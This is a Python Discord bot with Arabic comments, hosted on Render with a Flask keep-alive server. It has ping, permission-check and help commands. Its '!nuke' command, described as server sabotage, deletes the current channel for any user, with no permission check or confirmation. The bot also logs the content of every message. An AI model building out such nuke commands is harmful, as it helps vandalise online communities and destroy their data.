import discord
from discord.ext import commands
import os
import asyncio
from flask import Flask
from threading import Thread

# ---------- خادم Flask (لإبقاء البوت مستيقظاً) ----------
app = Flask(__name__)

@app.route('/')
def home():
    return "✅ Bot is alive on Render!"

def run_flask():
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = Thread(target=run_flask)
    t.start()

# ---------- إعداد البوت مع تفعيل جميع النيات ----------
intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)

# ---------- حدث التشغيل ----------
@bot.event
async def on_ready():
    print(f'✅ البوت متصل كـ {bot.user}')
    print(f'✅ موجود في {len(bot.guilds)} سيرفر')
    print(f'✅ البادئة المستخدمة: !')
    await bot.change_presence(activity=discord.Game(name="!ping | !nuke"))

# ---------- حدث استقبال أي رسالة (للتشخيص) ----------
@bot.event
async def on_message(message):
    # نتجاهل رسائل البوت نفسه لتجنب التكرار
    if message.author == bot.user:
        return

    # نطبع كل رسالة في سجلات Render
    print(f"📩 رسالة من {message.author} في #{message.channel}: {message.content}")

    # هذا السطر مهم جداً: يسمح للأوامر (commands) بالعمل
    await bot.process_commands(message)

# ---------- أمر اختبار بسيط (بدون صلاحيات) ----------
@bot.command(name='ping')
async def ping(ctx):
    """أمر بسيط لاختبار استجابة البوت"""
    await ctx.send("🏓 بونغ! البوت يعمل.")

# ---------- أمر اختبار آخر (للتأكد من صلاحيات القراءة) ----------
@bot.command(name='test')
async def test(ctx):
    """يعرض صلاحيات البوت في هذه القناة"""
    perms = ctx.channel.permissions_for(ctx.guild.me)
    msg = (
        "🔧 **صلاحياتي هنا:**\n"
        f"• قراءة الرسائل: {'✅' if perms.read_messages else '❌'}\n"
        f"• إرسال الرسائل: {'✅' if perms.send_messages else '❌'}\n"
        f"• إدارة القنوات: {'✅' if perms.manage_channels else '❌'}\n"
        f"• طرد الأعضاء: {'✅' if perms.kick_members else '❌'}\n"
        f"• حظر الأعضاء: {'✅' if perms.ban_members else '❌'}"
    )
    await ctx.send(msg)

# ---------- أمر nuke المبسط (بدون شرط صلاحيات مؤقتاً) ----------
@bot.command(name='nuke')
async def nuke(ctx):
    """نسخة مبسطة من nuke للاختبار (بدون تأكيد)"""
    await ctx.send("⚡ تم استقبال أمر nuke! سيتم تنفيذ التخريب خلال ثوانٍ...")

    # فقط للتوضيح: نحذف الغرفة الحالية كاختبار
    try:
        await ctx.channel.delete()
    except Exception as e:
        await ctx.send(f"❌ فشل حذف القناة: {e}")

# ---------- أمر مساعدة بسيط ----------
@bot.command(name='help')
async def help_cmd(ctx):
    await ctx.send("📋 **الأوامر المتاحة:**\n`!ping` - اختبار الاستجابة\n`!test` - عرض صلاحياتي\n`!nuke` - تخريب السيرفر (يتطلب صلاحيات)")

# ---------- تشغيل البوت ----------
if __name__ == "__main__":
    keep_alive()
    TOKEN = os.environ.get('DISCORD_TOKEN')
    if not TOKEN:
        print("❌ لم يتم العثور على التوكن! تأكد من إضافة DISCORD_TOKEN في متغيرات البيئة.")
    else:
        print("🔄 جارٍ تشغيل البوت...")
        bot.run(TOKEN)
